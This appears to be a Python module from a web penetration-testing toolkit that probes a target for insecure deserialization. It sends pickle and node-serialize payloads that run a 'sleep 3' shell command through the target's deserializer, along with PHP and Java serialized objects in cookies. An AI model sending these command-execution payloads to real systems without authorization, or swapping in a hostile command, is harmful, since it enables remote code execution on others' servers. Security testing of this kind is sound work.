#!/usr/bin/env python3
"""
Deserialization Tester
-----------------------
Tests for insecure deserialization vulnerabilities across multiple formats:
  • Java Serialization (ysoserial placeholders)
  • Python Pickle
  • PHP Object Injection
  • Node.js (node-serialize)
"""

import requests
import base64
from typing import List, Dict, Optional
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

console = Console()

# Safe payloads that trigger errors or harmless delays to confirm deserialization
DESERIALIZATION_PAYLOADS = [
    # Python Pickle (cos.system('sleep 3'))
    {
        "type": "Python Pickle",
        "payloads": [
            b"cposix\nsystem\np0\n(S'sleep 3'\np1\ntp2\nRp3\n.",
        ],
        "encoding": "base64",
    },
    # PHP Object Injection (generic magic method trigger attempt)
    {
        "type": "PHP Object Injection",
        "payloads": [
            b'O:8:"stdClass":1:{s:4:"test";s:4:"test";}',
            b'O:1:"A":0:{}',
        ],
        "encoding": "urlencode",
    },
    # Java Serialization (Magic bytes rO0AB)
    {
        "type": "Java Serialization",
        "payloads": [
            # Hex: ac ed 00 05
            b"\xac\xed\x00\x05sr\x00\x11java.lang.Integer\x12\xe2\xa0\xa4\xf7\x81\x878\x02\x00\x01I\x00\x05valuexr\x00\x10java.lang.Number\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00xp\x00\x00\x00\x01",
        ],
        "encoding": "base64",
    },
    # Node.js (node-serialize format)
    {
        "type": "Node.js (node-serialize)",
        "payloads": [
            b"{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('sleep 3');}()\"}",
        ],
        "encoding": "raw",
    },
]


class DeserializationTester:
    def __init__(self, target: str, session=None, timeout: int = 10, threads: int = 5):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.threads = threads
        self.session = session or requests.Session()
        self.session.verify = False
        self.session.headers.setdefault("User-Agent", "WebPwnToolkit/2.2")
        self.results: List[Dict] = []

    def _test_cookie(self, url: str) -> List[Dict]:
        findings = []
        for vuln_type in DESERIALIZATION_PAYLOADS:
            for raw_payload in vuln_type["payloads"]:
                encoded = raw_payload
                if vuln_type["encoding"] == "base64":
                    encoded = base64.b64encode(raw_payload).decode("utf-8")
                elif vuln_type["encoding"] == "urlencode":
                    import urllib.parse

                    encoded = urllib.parse.quote(raw_payload.decode("utf-8"))
                else:
                    encoded = raw_payload.decode("utf-8")

                try:
                    import time

                    t0 = time.time()
                    resp = self.session.get(
                        url,
                        cookies={"session": encoded, "data": encoded},
                        timeout=self.timeout,
                        verify=False,
                    )
                    elapsed = time.time() - t0

                    # Check for time delays (sleep 3)
                    if elapsed > 2.5 and ("sleep" in str(raw_payload)):
                        findings.append(
                            {
                                "url": url,
                                "type": f"Insecure Deserialization — Time Delay ({vuln_type['type']})",
                                "severity": "critical",
                                "cvss": 9.8,
                                "detail": f"Time delay observed when sending malicious serialized object. RCE possible.",
                                "evidence": f"Delay: {elapsed:.2f}s",
                                "owasp": "A08:2021 – Software and Data Integrity Failures",
                                "remediation": "Do not deserialize untrusted data. Use safe data formats like JSON.",
                            }
                        )

                    # Check for specific error messages
                    elif resp and any(
                        err in resp.text.lower()
                        for err in [
                            "java.io.invalidclassexception",
                            "unserialize():",
                            "pickle data was truncated",
                        ]
                    ):
                        findings.append(
                            {
                                "url": url,
                                "type": f"Insecure Deserialization — Error Triggered ({vuln_type['type']})",
                                "severity": "high",
                                "cvss": 8.1,
                                "detail": f"Server returned deserialization error. Indicates untrusted data is being deserialized.",
                                "evidence": f"Error found in response.",
                                "owasp": "A08:2021 – Software and Data Integrity Failures",
                                "remediation": "Do not deserialize untrusted data. Implement signature verification.",
                            }
                        )
                except Exception:
                    pass
        return findings

    def run(self) -> List[Dict]:
        console.print(
            f"\n  [bold yellow]▶ Deserialization Tester on {self.target}[/bold yellow]"
        )

        with Progress(
            SpinnerColumn(),
            TextColumn("[cyan]Testing deserialization...[/cyan]"),
            BarColumn(),
            console=console,
        ) as prog:
            task = prog.add_task("deser", total=1)
            prog.advance(task)
            res = self._test_cookie(self.target)
            for r in res:
                if r not in self.results:
                    self.results.append(r)
                    console.print(f"  [bold red][!] {r['type']}[/bold red]")

        color = "red" if self.results else "green"
        console.print(
            f"  [{color}]{len(self.results)} Deserialization issue(s) found[/]"
        )
        return self.results
